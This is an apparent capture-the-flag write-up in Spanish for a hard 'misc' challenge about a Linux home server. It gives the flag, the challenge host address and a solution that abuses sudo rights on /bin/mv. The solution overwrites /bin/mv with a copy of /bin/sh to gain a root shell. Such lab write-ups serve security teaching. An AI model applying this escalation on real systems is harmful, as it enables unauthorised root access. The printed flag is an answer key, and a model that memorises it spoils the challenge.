# Nombre: `Servidor Casero`
### Dificultad: `Hard (🃏🃏🃏🃏)`
### Categoría: `misc`
### Autor: [Cae](https://c4ebt.github.io/)
### Flag: `DCCTF{sud03rs_3s_p3l1gr0s0!}`

### Descripción:
Camilo me pidió que le montara un servidor linux en un computador viejo para poder guardar películas. No es muy computín, así que le dejé todo listo y le enseñé un solo comando que necesita para mover las películas cuando las descarga: `sudo mv`. Dudo que alguien pueda escalar a root con eso. `nc 104.237.138.109 5003`

La flag está en /root/flag.txt y solo es legible por root.

# Hint 1:
`sudo -l`

# Solución:
El user camilo tiene sudo perms para /bin/mv. Hay muchas soluciones posibles. Un ejemplo: `cd tmp; cp /bin/sh .; sudo /bin/mv sh /bin/mv; sudo /bin/mv;` para escalar a root, y luego se puede leer la flag.
